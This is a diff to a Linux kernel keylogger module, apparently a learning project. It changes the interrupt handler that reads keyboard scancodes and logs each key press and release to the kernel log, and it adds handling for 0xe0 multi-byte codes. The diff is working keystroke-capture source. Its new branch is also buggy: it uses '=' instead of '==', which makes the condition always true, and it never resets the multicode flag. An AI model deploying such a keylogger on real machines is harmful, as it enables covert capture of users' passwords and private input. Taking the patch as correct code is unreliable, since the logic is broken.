@@ -75,18 +75,41 @@ static irqreturn_t keylogger_handle(int irq_n, void *data)
 	t_keylogger_data	*logs = (t_keylogger_data *)data;
 	unsigned char		scancode;
 	struct key_info *key;
+	static char multicode = 0;
 	(void)logs;
 
 	scancode = inb(KB_PORT);
-	if (scancode <= 0x80)
+	if (scancode = 0xe0)
 	{
-		key = &scancode_to_key[scancode];
-		printk(KERN_INFO "Key pressed:'%s' with ascii value(%d)\n", key->name, key->ascii);
+		multicode = 1;
+		return IRQ_HANDLED;
+	}
+	if (multicode)
+	{
+		if (scancode <= 0x80)
+		{
+			key = &multicode_to_key[scancode];
+			printk(KERN_INFO "Key pressed:'%s' with ascii value(%d)\n", key->name, key->ascii);
+		}
+		else
+		{
+			key = &multicode_to_key[scancode - 0x80];
+			printk(KERN_INFO "Key released:'%s' with ascii value(%d)\n", key->name, key->ascii);
+		}
+
 	}
 	else
 	{
-		key = &scancode_to_key[scancode - 0x80];
-		printk(KERN_INFO "Key released:'%s' with ascii value(%d)\n", key->name, key->ascii);
+		if (scancode <= 0x80)
+		{
+			key = &scancode_to_key[scancode];
+			printk(KERN_INFO "Key pressed:'%s' with ascii value(%d)\n", key->name, key->ascii);
+		}
+		else
+		{
+			key = &scancode_to_key[scancode - 0x80];
+			printk(KERN_INFO "Key released:'%s' with ascii value(%d)\n", key->name, key->ascii);
+		}
 	}
 	return IRQ_HANDLED;
 }
